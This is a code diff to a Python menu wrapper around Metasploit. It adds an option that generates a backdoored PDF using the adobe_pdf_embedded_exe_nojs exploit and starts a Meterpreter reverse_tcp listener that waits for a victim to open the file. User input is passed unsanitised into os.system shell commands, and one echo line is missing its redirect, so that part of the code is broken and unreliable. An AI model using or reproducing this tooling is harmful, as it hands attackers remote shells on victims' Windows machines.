@@ -35,6 +35,7 @@ help="""
 | banner           | Show the banner.           |
 | show payloads    | Show Payloads.             |
 | show auxiliarys  | Show Auxiliarys.           |
+| show exploits    | Show Exploits.             |
 +-----------------------------------------------+
 
 """
@@ -86,6 +87,16 @@ auxiliarys="""
 +====================================================+
 
 """
+
+exploits="""
+
++=======================================================+
+|                   Exploits Totals:                    |
+|                     1 Exploit                         |
+| exploit/windows/fileformat/adobe_pdf_embedded_exe_nojs|
+|                                                       |
++=======================================================+
+"""
 # se inicia la db de metasploit para mas rapidez :)
 
 os.system("service postgresql start")
@@ -122,6 +133,13 @@ def main():
         print(payloads)
         main()
 
+    if opcion=="show exploits":
+        os.system("clear")
+        blue()
+        print(banner)
+        print(exploits)
+        main()
+
     if opcion =="banner":
         os.system("clear")
         blue()
@@ -136,7 +154,7 @@ def main():
         main()
 
     if opcion =="exit":
-        os.system("rm android_tcp.rb android_http.rb windows_tcp.rb windows_http.rb linux_tcp.rb gmails.rb sdomains.rb")
+        os.system("rm android_tcp.rb android_http.rb windows_tcp.rb windows_http.rb linux_tcp.rb gmails.rb sdomains.rb adobejs_listener.rb adobe_pdfjs.rb")
         print("Good Bye!")
         exit()
 
@@ -182,6 +200,8 @@ def main():
     if opcion =="use auxiliary/gather/searchengine_subdomains_collector":
         search_sdomains()
     
+    if opcion=="use exploit/windows/fileformat/adobe_pdf_embedded_exe":
+        adobe_exe()
 
 def android_tcp():
     os.system("clear")
@@ -395,4 +415,46 @@ def search_sdomains():
     print(banner)
     main()
 
+def adobe_exe():
+    os.system("clear")
+    print(banner)
+    red()
+    print("Using: exploit/windows/fileformat/adobe_pdf_embedded_exe_nojs")
+    filename = input("File name: ")
+    lhost = input("Attacker IP: ")
+    lport = input("Listen port: ")
+    print("Ok!")
+    green()
+    print("+------------------------------------------------------------------+ ")
+    print("+-> Exploit data")
+    print("+-> Auxiliary: exploit/windows/fileformat/adobe_pdf_embedded_exe_nojs")
+    print("+-> Filename: "+filename+"")
+    print("+-> Attacker IP: "+lhost+"")
+    print("+-> Listen Port: "+lport+"")
+    print("+------------------------------------------------------------------+ ")
+    print("Running metasploit...")
+    # se crea el .rb del pdf
+    os.system("echo 'use exploit/windows/fileformat/adobe_pdf_embedded_exe_nojs' >> adobe_pdfjs.rb")
+    os.system("echo 'set filename "+filename+".pdf' >> adobe_pdfjs.rb")
+    os.system("echo 'set lhost "+lhost+"' adobe_pdfjs.rb")
+    os.system("echo 'set lport "+lport+"' >> adobe_pdfjs.rb")
+    os.system("echo 'exploit' >> adobe_pdfjs.rb")
+    # ahora se crea el listener para esperar a que la victima abra el pdf backdoor
+    os.system("echo 'use exploit/multi/handler' >> adobejs_listener.rb")
+    os.system("echo 'set payload windows/meterpreter/reverse_tcp' >> adobejs_listener.rb")
+    os.system("echo 'set lhost "+lhost+"' >> adobejs_listener.rb")
+    os.system("echo 'set lport "+lport+"' >> adobejs_listener.rb")
+    os.system("echo 'exploit' >> adobejs_listener.rb")
+    # ahora se lanzan las terminales de metasploit
+    # lanza la terminal de crear pdf
+    os.system("gnome-terminal -- msfconsole -r adobe_pdfjs.rb &")
+    # lanza la terminal del listener
+    os.system("gnome-terminal -- msfconsole -r adobejs_listener.rb &")
+    os.system("clear")
+    print(banner)
+    main()
+
+
 main()
+
+# si copias y pegas tan siquiera da creditos pls me costo hacer esto
